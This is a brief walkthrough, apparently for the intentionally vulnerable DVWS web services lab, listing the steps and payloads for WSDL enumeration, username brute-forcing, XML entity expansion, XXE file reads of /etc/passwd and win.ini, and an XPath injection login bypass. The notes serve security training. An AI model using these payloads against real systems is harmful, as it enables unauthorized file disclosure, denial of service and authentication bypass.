### WSDL Enumeration
URL: dvws/vulnerabilities/wsdlenum/service.php?wsdl

check_user_id with value root

### WSDL Scanning 
* Load the check_user_information envelope into Intruder
* select username space 
* add username lists to payload


### XML External Entity Injection
URL : /dvws/vulnerabilities/xxe/

[XML Entity Expansion]

<!DOCTYPE foo [<!ENTITY entity0 "foo"><!ENTITY entity1 "&entity0;&entity0;"><!ENTITY entity2 "&entity1;&entity1;"><!ENTITY entity3 "&entity2;&entity2;">]><name>foo and&entity3;</name>


[XXE]

name=<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>
 
 
name=<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>


### XPATH Injection
URL: /dvws/vulnerabilities/xpath/xpath.php



username: foo' or 1=1 or 'a'='a 
password: bar


